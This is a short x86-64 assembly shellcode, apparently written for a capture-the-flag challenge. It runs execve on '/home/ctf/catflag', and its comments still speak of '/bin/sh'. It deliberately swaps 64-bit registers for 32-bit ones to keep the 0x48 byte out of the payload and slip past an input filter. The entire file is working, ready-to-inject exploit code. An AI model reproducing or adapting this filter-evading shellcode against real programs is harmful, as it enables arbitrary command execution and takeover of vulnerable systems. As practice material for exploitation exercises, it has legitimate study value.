.global _start
_start:
.intel_syntax noprefix
    # change r registers (rax, rdi, etc) to e registers
    # to avoid byte 0x48 (H char) from appearing in shellcode
	mov eax, 59            # execve syscall number
	lea edi, [rip+binsh]   # points rdi to /bin/sh string
	xor esi, esi             # makes argv arg null
	xor edx, edx             # makes envp arg null
	syscall
binsh:                     # label for /bin/sh string
	.string "/home/ctf/catflag"
 